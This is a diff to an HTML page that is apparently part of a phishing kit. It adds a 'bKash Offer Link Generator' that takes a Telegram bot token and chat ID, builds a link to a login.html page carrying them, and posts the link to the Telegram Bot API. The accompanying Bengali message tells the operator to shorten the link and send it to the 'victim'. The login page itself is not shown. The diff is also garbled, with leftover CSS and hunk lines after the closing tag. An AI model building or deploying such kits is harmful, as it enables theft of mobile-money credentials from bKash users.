@@ -4,17 +4,13 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="shortcut icon" href="https://telegra.ph/file/50c450dbb935cc7172222.jpg" />
-    <meta property="og:title" content="আপনার টাইটেল দিবেন লিংকের" />
-    <meta property="og:description" content="আপনার লিংকের টাইটেল" />
-    <meta property="og:image" content="https://telegra.ph/file/5705ea8ba013f704204f2.jpg" />
-    <title>Premium Link Generator</title>
+    <title>bKash Offer Link Generator</title>
     
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
     
     <style>
         :root {
             --primary-color: #e4136b;
-            --secondary-color: #c5115a;
             --bg-gradient: linear-gradient(135deg, #e4136b 0%, #6b0f3a 100%);
         }
 
@@ -22,86 +18,150 @@
             background: var(--bg-gradient);
             font-family: 'Poppins', sans-serif;
             margin: 0;
-            padding: 0;
             display: flex;
             flex-direction: column;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
             color: #fff;
-            overflow: hidden;
         }
 
         .container {
             background: rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(10px);
+            backdrop-filter: blur(15px);
             border: 1px solid rgba(255, 255, 255, 0.2);
             padding: 30px;
             border-radius: 20px;
-            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3);
             width: 90%;
-            max-width: 380px;
+            max-width: 400px;
             text-align: center;
-            animation: slideUp 0.8s ease-out;
+            animation: fadeIn 0.8s ease-in-out;
         }
 
-        @keyframes slideUp {
-            from { opacity: 0; transform: translateY(30px); }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
             to { opacity: 1; transform: translateY(0); }
         }
 
         .logo img {
-            max-width: 120px;
-            margin-bottom: 15px;
-            filter: drop-shadow(0 5px 15px rgba(0,0,0,0.1));
+            max-width: 100px;
+            margin-bottom: 10px;
         }
 
-        .title {
-            font-size: 22px;
-            font-weight: 600;
-            margin-bottom: 25px;
-            letter-spacing: 1px;
-            border-bottom: 2px solid rgba(255,255,255,0.2);
-            padding-bottom: 10px;
-        }
+        h2 { font-size: 20px; margin-bottom: 20px; font-weight: 600; }
 
-        .input-group {
-            margin-bottom: 20px;
-            text-align: left;
-        }
+        .input-group { text-align: left; margin-bottom: 15px; }
+        .input-group p { margin: 0 0 5px 5px; font-size: 14px; }
 
-        .input-group p {
-            margin: 0 0 8px 5px;
-            font-size: 14px;
-            font-weight: 300;
-        }
-
-        input[type="text"],
-        input[type="number"] {
+        input {
             width: 100%;
-            padding: 12px 15px;
+            padding: 12px;
+            border-radius: 10px;
             border: none;
-            border-radius: 12px;
             background: rgba(255, 255, 255, 0.9);
             color: #333;
-            font-size: 14px;
             box-sizing: border-box;
-            transition: all 0.3s ease;
-        }
-
-        input:focus {
             outline: none;
-            transform: scale(1.02);
-            box-shadow: 0 0 15px rgba(255, 255, 255, 0.3);
         }
 
-        #loginButton {
+        #genBtn {
             background: #fff;
             color: var(--primary-color);
             border: none;
-            padding: 12px 25px;
-            border-radius: 12px;
+            padding: 12px;
+            width: 100%;
+            border-radius: 10px;
+            font-weight: 600;
             cursor: pointer;
+            transition: 0.3s;
+            margin-top: 10px;
+            font-size: 16px;
+        }
+
+        #genBtn:hover {
+            background: var(--primary-color);
+            color: #fff;
+            transform: scale(1.02);
+        }
+
+        .footer { margin-top: 20px; font-size: 13px; }
+        .footer a { color: #ffd700; text-decoration: none; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+    <div class="logo">
+        <img src="https://i.ibb.co/0s3npSv/5e6ab3fa58a91-removebg-preview-1.png" alt="Logo">
+    </div>
+
+    <div class="container">
+        <h2>Link Generator</h2>
+        
+        <div class="input-group">
+            <p>Telegram Bot Token</p>
+            <input type="text" id="token" placeholder="123456:ABC-DEF...">
+        </div>
+
+        <div class="input-group">
+            <p>Your Chat ID</p>
+            <input type="number" id="chatId" placeholder="e.g. 5080596463">
+        </div>
+
+        <button id="genBtn">Generate & Send Link 🚀</button>
+    </div>
+
+    <div class="footer">
+        Developed by <a href="https://sujon403pi.vercel.app/">Sujon Islam</a> | 
+        <a href="https://t.me/Freedom369_4u">Join Channel</a>
+    </div>
+
+    <script>
+        document.getElementById('genBtn').addEventListener('click', function() {
+            const token = document.getElementById('token').value.trim();
+            const chatId = document.getElementById('chatId').value.trim();
+            
+            // আপনার বর্তমান ডোমেইন বা GitHub Pages এর ইউআরএল এখানে বসবে
+            const baseUrl = window.location.href.replace('index.html', '').replace(/\/$/, "");
+            const loginUrl = `${baseUrl}/login.html?token=${token}&id=${chatId}`;
+
+            if (token && chatId) {
+                this.innerText = "Sending to Telegram...";
+                this.disabled = true;
+
+                const message = `🔗 <b>আপনার অফার পেজ লিংক তৈরি হয়েছে:</b>\n\n` +
+                                `<code>${loginUrl}</code>\n\n` +
+                                `🔖 লিংকটি কপি করে শর্টনার (t.ly বা bitly) দিয়ে ছোট করে ভিকটিমকে পাঠান।`;
+
+                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                })
+                .then(res => res.json())
+                .then(data => {
+                    if (data.ok) {
+                        alert('✅ লিংক আপনার টেলিগ্রাম বোটে পাঠানো হয়েছে!');
+                    } else {
+                        alert('❌ ভুল টোকেন বা আইডি! আবার চেক করুন।');
+                    }
+                })
+                .catch(err => alert('Error: ' + err.message))
+                .finally(() => {
+                    this.innerText = "Generate & Send Link 🚀";
+                    this.disabled = false;
+                });
+            } else {
+                alert('সবগুলো ঘর পূরণ করুন!');
+            }
+        });
+    </script>
+</body>
+</html>
             width: 100%;
             font-weight: 600;
             font-size: 16px;
@@ -225,6 +285,7 @@
     </script>
 </body>
 </html>
+
 
 
 
